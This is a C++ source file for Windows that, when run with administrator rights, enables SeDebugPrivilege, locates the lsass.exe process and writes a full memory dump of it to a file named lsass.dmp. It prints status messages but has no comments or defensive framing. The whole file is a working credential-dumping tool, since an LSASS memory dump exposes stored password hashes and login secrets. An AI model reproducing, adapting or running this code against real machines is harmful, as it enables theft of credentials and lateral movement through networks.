#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "Ws2_32.lib")

#include <fstream>
#include <vector>
#include <string>
#include <iostream>
#include <windows.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include <sstream>
#define UNCLEN 512

using namespace std;

bool IsProcessElevated() {
    bool isElevated = false;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;

        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isElevated = elevation.TokenIsElevated != 0;
        }

        CloseHandle(token);
    }

    return isElevated;
}

DWORD GetProcessIdByName(const std::wstring& processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe)) {
            do {
                if (std::wstring(pe.szExeFile) == processName) {
                    processId = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }

        CloseHandle(hSnapshot);
    }

    return processId;
}

bool SetDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

int main() {
    if (IsProcessElevated()) {
        string lsass_processname = "lsass.exe";
        string filename = "lsass.dmp";

        std::wstring processname(lsass_processname.begin(), lsass_processname.end());
        const wchar_t* szName = processname.c_str();


        DWORD ProcPID = GetProcessIdByName(szName);
        cout << "[OK] process PID: " << ProcPID << endl;
        bool SetPriv = SetDebugPrivilege();

        if (SetPriv) {
            cout << "[OK] SetDebugPrivilege done" << endl;
            std::wstring stemp = std::wstring(filename.begin(), filename.end());
            LPCWSTR pointer_filename = stemp.c_str();

            HANDLE output = CreateFile(pointer_filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            DWORD processAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
            HANDLE processHandler = OpenProcess(processAllow, 0, ProcPID);

            if (processHandler && processHandler != INVALID_HANDLE_VALUE)
            {

                bool isDumped = MiniDumpWriteDump(processHandler, ProcPID, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);

                if (isDumped)
                {
                    cout << "[OK] Dump done : " << filename << endl;
                }
                else
                {
                    cout << "[KO] Unable to dump" << endl;
                    return 1;
                }
            }
            else
            {
                wcout << "[KO] Unable to create handler process" << endl;
                return 1;
            }

        }

    }
    else {
        cout << "[KO] Requires administrative privileges" << endl;
    }
}
